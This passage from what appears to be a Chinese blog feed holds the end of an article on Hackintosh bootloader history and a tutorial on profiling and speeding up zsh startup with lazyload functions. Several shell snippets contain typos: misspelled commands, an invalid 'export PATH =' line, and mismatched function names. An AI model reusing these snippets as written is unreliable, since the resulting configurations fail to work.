中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\">\n<div class=\"license-title\">黑苹果的历史</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-09-02</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">unsetopt</span> XTRACE<span class=\"hljs-built_in\">exec</span> 2&gt;&amp;3 3&gt;&amp;-</code></pre>\n<p>这会在 <code>$HOME</code> 目录下生成一个文件名包含随机字符串的文件（<code>zsh_profile.123456</code> ）。一些介绍 zsh profiling 的文章会推荐使用 <a href=\"http://kcachegrind.sourceforge.net/html/Home.html\">kcachegrind</a> 这个工具可视化这个文件，但是我们只需要知道是什么拖累了 zsh 冷启动，将这个文件格式化一下即可。这里提供一个简单的脚本：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-meta\">#!/usr/bin/env zsh</span><span class=\"hljs-built_in\">typeset</span> -a lines<span class=\"hljs-built_in\">typeset</span> -i prev_time=0<span class=\"hljs-built_in\">typeset</span> prev_command<span class=\"hljs-keyword\">while</span> <span class=\"hljs-built_in\">read</span> line; <span class=\"hljs-keyword\">do</span>    <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$line</span> =~ <span class=\"hljs-string\">'^.*\\+([0-9]{10})\\.([0-9]{6})[0-9]* (.+)'</span> ]]; <span class=\"hljs-keyword\">then</span>        <span class=\"hljs-built_in\">integer</span> this_time=<span class=\"hljs-variable\">$match</span>[1]<span class=\"hljs-variable\">$match</span>[2]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$prev_time</span> -gt 0 ]]; <span class=\"hljs-keyword\">then</span>            time_difference=$(( <span class=\"hljs-variable\">$this_time</span> - <span class=\"hljs-variable\">$prev_time</span> ))            lines+=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$time_difference</span> <span class=\"hljs-variable\">$prev_command</span>\"</span>        <span class=\"hljs-keyword\">fi</span>        prev_time=<span class=\"hljs-variable\">$this_time</span>        <span class=\"hljs-built_in\">local</span> this_command=<span class=\"hljs-variable\">$match</span>[3]        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">${#this_command}</span> -le 80 ]]; <span class=\"hljs-keyword\">then</span>            prev_command=<span class=\"hljs-variable\">$this_command</span>        <span class=\"hljs-keyword\">else</span>            prev_command=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${this_command:0:77}</span>...\"</span>        <span class=\"hljs-keyword\">fi</span>    <span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">done</span> &lt; <span class=\"hljs-variable\">${1:-/dev/stdin}</span><span class=\"hljs-built_in\">print</span> -l <span class=\"hljs-variable\">${(@On)lines}</span></code></pre>\n<p>将上述内容保存在 <code>$HOME</code> 目录下 <code>format_profile.zsh</code> 文件中，然后在终端中执行：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">cd</span> <span class=\"hljs-variable\">$HOME</span>$ chmod +x format_profile.zsh$ ./format_profile.zsh zsh_profile.123456 | head -n 30356910 _zsh_nvm_auto_use:14&gt; [[ none != N/A ]]307791 /Users/sukka/.zshrc:312&gt; hexo <span class=\"hljs-string\">'--completion=zsh'</span>178444 /Users/sukka/.zshrc:310&gt; thefuck --<span class=\"hljs-built_in\">alias</span>161193 nvm_version:21&gt; VERSION=N/A148555 nvm_version:21&gt; VERSION=N/A96497 (<span class=\"hljs-built_in\">eval</span>):4&gt; pyenv <span class=\"hljs-built_in\">rehash</span>58759 /Users/sukka/.zshrc:311&gt; pyenv init -48629 nvm_auto:15&gt; VERSION=<span class=\"hljs-string\">''</span>42779 /Users/sukka/.zshrc:114&gt; FPATH=/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions:/usr/<span class=\"hljs-built_in\">local</span>...42527 nvm_auto:15&gt; nvm_resolve_local_alias default41620 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>35577 nvm_resolve_local_alias:7&gt; VERSION=<span class=\"hljs-string\">''</span>29444 _zsh_nvm_load:6&gt; <span class=\"hljs-built_in\">source</span> /Users/sukka/.nvm/nvm.sh24967 compaudit:154&gt; _i_wfiles=( )24889 nvm_resolve_alias:15&gt; ALIAS_TEMP=<span class=\"hljs-string\">''</span>22000 nvm_auto:18&gt; nvm_rc_version20890 nvm_ls:29&gt; PATTERN=default[Redacted]</code></pre>\n<p>这样就一目了然了。可以看到，除了 <code>nvm</code> 以外、<code>hexo</code> 的自动补全、<code>thefuck</code> 的初始化、<code>pyenv</code> 都大幅拖慢了 zsh 的启动速度。</p>\n<h2>Lazyload</h2>\n<p>你可能听过 <a href=\"https://blog.skk.moe/post/img-lazyload-hexo/\">网页的图片可以 lazyload</a>、<a href=\"https://blog.skk.moe/post/prevent-disqus-from-slowing-your-site/\">Disqus 评论系统可以 lazyload</a>，但是 <code>.zshrc</code> 一样也有 lazyload。lazyload 的特点是启动时快，首次使用时慢，因此很适合用于优化不常用而且初始化非常耗时的功能。</p>\n<p>lazyload 的方法是声明一个占位函数，当执行这个函数时完成对真实命令的初始化、并移除命令占位。以 pyenv 为例：</p>\n<pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 提前将 .pyenv/shims 添加到 PATH 中，这样即使 pyenv 没有初始化也可以使用 Python</span><span class=\"hljs-built_in\">export</span> PATH=<span class=\"hljs-string\">\"/Users/sukka/.pyenv/shims:<span class=\"hljs-variable\">${PATH}</span>\"</span><span class=\"hljs-function\"><span class=\"hljs-title\">pyenv</span></span>() {  <span class=\"hljs-comment\"># 移除占位函数</span>  unfuntion pyenv  <span class=\"hljs-comment\"># 初始化 pyenv</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>  <span class=\"hljs-comment\"># 继续执行 pyenv 命令</span>  pyenv <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$@</span>\"</span>}</code></pre>\n<p>pyenv 在初始化时会自动加载补全（completion），但是由于 lazyload、第一次执行 <code>pyenv</code> 时就没有补全了，因此还需要为补全添加 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">__lazyload_completion_pyenv</span></span>() {  <span class=\"hljs-comment\"># 删除 pyenv 命令补全的占位</span>  comdef -d pyenv  <span class=\"hljs-comment\"># 移除 pyenv 占位函数</span>  <span class=\"hljs-built_in\">unfunction</span> pyenv  <span class=\"hljs-comment\"># 加载真正的 pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}compdef __lazyload_completion_pyenv pyenv</code></pre>\n<p>这样，当首次输入 <code>pyenv</code> 并按下 Tab 时会加载 pyenv 的命令补全，第二次按下 Tab 时就可以正常显示命令补全了。</p>\n<p>将上述 lazyload 封装成函数便于调用：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_command</span></span>() {    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>() { \\</span><span class=\"hljs-string\">        unfunction <span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        _sukka_lazyload__command_<span class=\"hljs-variable\">$1</span> \\</span><span class=\"hljs-string\">        <span class=\"hljs-variable\">$1</span> \\$@ \\</span><span class=\"hljs-string\">    }\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">sukka_lazyload_add_completion</span></span>() {    <span class=\"hljs-built_in\">local</span> comp_name=<span class=\"hljs-string\">\"_sukka_lazyload__compfunc_<span class=\"hljs-variable\">$1</span>\"</span>    <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${comp_name}</span>() { \\</span><span class=\"hljs-string\">        compdef -d <span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">        _sukka_lazyload_completion_<span class=\"hljs-variable\">$1</span>; \\</span><span class=\"hljs-string\">    }\"</span>    compdef <span class=\"hljs-variable\">$comp_name</span> <span class=\"hljs-variable\">$1</span>}</code></pre>\n<p>使用封装好的 lazyload 函数添加 <code>pyenv</code> 和 <code>thefuck</code> 的 lazyload、Hexo completion 的 lazyload：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 初始化</span>  <span class=\"hljs-built_in\">eval</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(command pyenv init -)</span>\"</span>}<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__compfunc_pyenv</span></span>() {  <span class=\"hljs-comment\"># pyenv 命令补全</span>  <span class=\"hljs-built_in\">source</span> <span class=\"hljs-string\">\"<span class=\"hljs-subst\">$(brew --prefix pyenv)</span>/completions/pyenv.zsh\"</span>}<span class=\"hljs-comment\"># 添加 pyenv 的 lazyload</span>sukka_lazyload_add_command pyenvsukka_lazyload_add_completion pyenv<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__command_fuck</span></span>() {  <span class=\"hljs-comment\"># fuck 初始化</span>  <span class=\"hljs-built_in\">eval</span> $(thefuck --<span class=\"hljs-built_in\">alias</span>)}<span class=\"hljs-comment\"># 添加 fuck 的 lazyload</span>sukka_lazyload_add_command fuck<span class=\"hljs-function\"><span class=\"hljs-title\">_sukka_lazyload__completion_hexo</span></span>() {  <span class=\"hljs-comment\"># hexo 的 completion</span>  <span class=\"hljs-built_in\">eval</span> $(hexo --completion=zsh)}<span class=\"hljs-comment\"># 添加 hexo completion 的 lazyload</span>sukka_lazyload_add_completion hexo</code></pre>\n<h2>替换 NVM</h2>\n<p>我使用 nvm 的方式是 <code>zsh-nvm</code> 插件。由于我的开发环境也高度依赖 <code>.nvmrc</code> 文件，所以不得不启用 nvm auto use。由于我的许多工具高度依赖 Node.js（如我的 <a href=\"https://nali.skk.moe/\">Nali CLI</a>），lazyload nvm 也是不现实的。我不得不寻找另一个代替 nvm 的 Node.js 版本管理器，最后我选中了 <a href=\"https://github.com/tj/n\"><code>tj/n</code></a>。</p>\n<p>首先是卸载 nvm、nvm 安装的所有 Node.js 版本、以及 zsh-nvm 插件：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 卸载 nvm 及其安装的 Node.js</span>$ rm -rf <span class=\"hljs-variable\">$HOME</span>/.nvm<span class=\"hljs-comment\"># 删除 zsh-nvm 插件</span>$ rm -rf <span class=\"hljs-variable\">$ZSH</span>/custom/plugins/zsh-nvm<span class=\"hljs-comment\"># 除了删除目录，还需要在 .zshrc 中的 plugins 数组中删除 zsh-nvm</span></code></pre>\n<p>接着安装 <code>tj/n</code> 作为 Node.js 版本管理器，macOS 上可以通过 Homebrew 直接安装：</p>\n<pre><code class=\"hljs bash\">$ brew install n</code></pre>\n<p>在 <code>.zshrc</code> 中配置 <code>tj/n</code>：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># tj/n 的路径</span><span class=\"hljs-built_in\">export</span> N_PREFIX=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$HOME</span>/.n\"</span><span class=\"hljs-comment\"># 当切换 Node.js 版本时保留 npm</span><span class=\"hljs-built_in\">export</span> N_PRESERVE_NPM=1<span class=\"hljs-comment\"># 将 tj/n 添加到 PATH</span><span class=\"hljs-built_in\">export</span> PATH = <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$N_PREFIX</span>/bin:<span class=\"hljs-variable\">$PATH</span>\"</span></code></pre>\n<h2>使用 zsh 内置语法</h2>\n<p>zsh 强大之处不仅在于内建的插件、优雅的使用方式，更重要的是极其强大的语法。在 <code>.zshrc</code> 广泛使用 zsh 内置的语法可以大幅提高执行性能。</p>\n<h3>zsh 判断命令是否存在</h3>\n<p>我们经常需要在 <code>.zshrc</code> 之中编写命令是否存在的条件语句，比如「仅当命令存在时加载该命令的自动补全」，或者「当 Node.js 存在时输出 Node.js 版本」。通常情况下我们会写出以下三种条件判断方式：</p>\n<pre><code class=\"hljs bash\">[[ <span class=\"hljs-built_in\">command</span> -v node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">which</span> -a node &amp;&gt;/dev/null ]] &amp;&amp; node -v[[ <span class=\"hljs-built_in\">type</span> node &amp;&gt;/dev/null ]] &amp;&amp; node -v</code></pre>\n<p>但是在 zsh 中，还有一种速度更快的判断命令存在的方法：</p>\n<pre><code class=\"hljs bash\">(( $+commands[node] )) &amp;&amp; node -v</code></pre>\n<p>zsh 提供了一个数组元素查找语法 <code>$+array[item]</code> （元素存在则返回 1 否则返回 0），同时 zsh 也维护了一个命令数组 <code>$commands</code>，在数组中检索元素比调用 <code>which</code>、<code>type</code>、<code>command -v</code> 命令都要快许多。</p>\n<h3>变量字符串查找</h3>\n<p>在 <code>.zshrc</code> 中鲜少需要用到这样的语法，不过依然存在一些 case，比如为了避免向 <code>$FPATH</code> 中重复添加 Homebrew 的自动补全，提前检查 <code>$FPATH</code> 中是否已经包含了 Homebrew 的路径。一般常见的写法都涉及到 <code>echo</code> 和 <code>grep</code> ：</p>\n<pre><code class=\"hljs bash\">[[ $(<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$FPATH</span> | grep <span class=\"hljs-string\">\"/usr/local/share/zsh/site-functions\"</span>) ]] &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>但是在 zsh 中我们不需要 <code>grep</code> 也可以实现同样的功能：</p>\n<pre><code class=\"hljs bash\">(( <span class=\"hljs-variable\">$FPATH</span>[(I)/usr/<span class=\"hljs-built_in\">local</span>/share/zsh/site-functions] )) &amp;&amp; <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"homebrew exists in fpath\"</span></code></pre>\n<p>zsh 内置了在变量中匹配字符串的语法：<code>$variable[(i)keyword]</code> 和 <code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 